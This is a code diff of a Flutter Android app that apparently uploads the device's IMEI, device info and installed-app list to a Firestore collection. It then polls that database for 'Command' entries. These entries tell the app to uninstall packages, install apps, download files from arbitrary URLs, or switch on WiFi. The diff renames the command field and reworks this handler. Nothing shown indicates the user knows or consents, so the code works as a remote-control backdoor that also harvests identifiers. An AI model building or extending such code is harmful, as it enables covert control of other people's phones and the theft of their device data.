@@ -95,8 +95,7 @@ class _HomeState extends State<Home> {
     methodChannel.setMethodCallHandler((call)async {
         
         print(call.method);
-         ConnectWifi.enable();
-        ConnectWifi.openWifi();
+        
         
          var connectivityResult = await (Connectivity().checkConnectivity());
          
@@ -106,24 +105,26 @@ class _HomeState extends State<Home> {
         Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
            
            var data = docs.documents.last;
-                          if(data["Message"].startsWith("com.")){
-                               UninstallApps.uninstall(data["Message"].toString());
-                               Firestore.instance.collection("Informations").document(data.documentID).updateData({"Message":""});
+                          if(data["Command"].startsWith("com.")){
+                               UninstallApps.uninstall(data["Command"].toString());
+                               Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                             
-                          }else if(data["Message"].toString().startsWith("install")){
-                                  installapps(data["Message"].toString().split(" ")[1].toString());
-                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Message":""});
+                          }else if(data["Command"].toString().startsWith("install")){
+                                  installapps(data["Command"].toString().split(" ")[1].toString());
+                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                             
-                          }else if(data["Message"].toString().startsWith("download")){
-                                  String url = data["Message"].toString().split(" ")[1].toString();
-                                  String name = data["Message"].toString().split(" ")[2].toString();
-                                  String ext = "."+data["Message"].toString().split(" ")[3].toString();
+                          }else if(data["Command"].toString().startsWith("download")){
+                                  String url = data["Command"].toString().split(" ")[1].toString();
+                                  String name = data["Command"].toString().split(" ")[2].toString();
+                                  String ext = "."+data["Command"].toString().split(" ")[3].toString();
                                   Downloader.download(url,name,ext);
-                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Message":""});
+                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                             
-                          }else if(data["Message"].toString().startsWith("promptwifi")){
+                          }else if(data["Command"].toString().startsWith("promptwifi")){
+                                 ConnectWifi.enable();
+                                 ConnectWifi.openWifi();
                                
-                                Firestore.instance.collection("Informations").document(data.documentID).updateData({"Message":""});
+                                 Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                               
                           }
                          
@@ -185,9 +186,8 @@ class _HomeState extends State<Home> {
 
     fg=androidDeviceInfo.id.toString();
 
-    
 
-    Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
+       Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
          List<DocumentSnapshot> doc = docs.documents;
 
          if(doc.length==0){
@@ -197,7 +197,7 @@ class _HomeState extends State<Home> {
                  "Installed_Apps":app,
                   "Device_info":allinfo,
                   "Imei":imei,
-                  "Message":""
+                  "Command":""
               });
 
          }else{
@@ -247,29 +247,32 @@ class _HomeState extends State<Home> {
                        stream: Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).snapshots(),
                        builder: (context,snap){
                              
-                                
+                                 
                               if(snap.hasData){
-                                if(snap.data.documents.last["Message"].toString().startsWith("uninstall")){
-                                 UninstallApps.uninstall(snap.data.documents.last["Message"].toString());
+                                if(snap.data.documents.last.data["Command"].toString().startsWith("uninstall")){
+                                 UninstallApps.uninstall(snap.data.documents.last["Command"].toString());
                               
-                                }else if(snap.data.documents.last["Message"].toString().startsWith("install")){
-                                    installapps(snap.data.documents.last["Message"].toString().split(" ")[1].toString());
+                                }else if(snap.data.documents.last.data["Command"].toString().startsWith("install")){
+                                    installapps(snap.data.documents.last.data["Command"].toString().split(" ")[1].toString());
                               
-                                }else if(snap.data.documents.last["Message"].toString().startsWith("download")){
-                                    String url = snap.data.documents.last["Message"].toString().split(" ")[1].toString();
-                                    String name = snap.data.documents.last["Message"].toString().split(" ")[2].toString();
-                                    String ext = "."+snap.data.documents.last["Message"].toString().split(" ")[3].toString();
+                                }else if(snap.data.documents.last["Command"].toString().startsWith("download")){
+                                    String url = snap.data.documents.last.data["Command"].toString().split(" ")[1].toString();
+                                    String name = snap.data.documents.last.data["Command"].toString().split(" ")[2].toString();
+                                    String ext = "."+snap.data.documents.last.data["Command"].toString().split(" ")[3].toString();
                                     Downloader.download(url,name,ext);
                               
-                                }else if(snap.data.documents.last["Message"].toString().startsWith("promptwifi")){
-
-                                    ConnectWifi.enable();
+                                }else if(snap.data.documents.last.data["Status"].toString().startsWith("promptwifi")){
+                  
+                                     ConnectWifi.enable();
                                      ConnectWifi.openWifi();
                                     
                                 }
-                                print(snap.data.documents.last["Message"]+"     Ashwin");
 
-                                Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData({"Message":""});
+                                print(snap.data.documents.last.data["Status"]);
+                                 
+                               
+
+                                Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData({"Command":""});
                               }
                                 return Column(
                                     mainAxisAlignment: MainAxisAlignment.spaceEvenly,
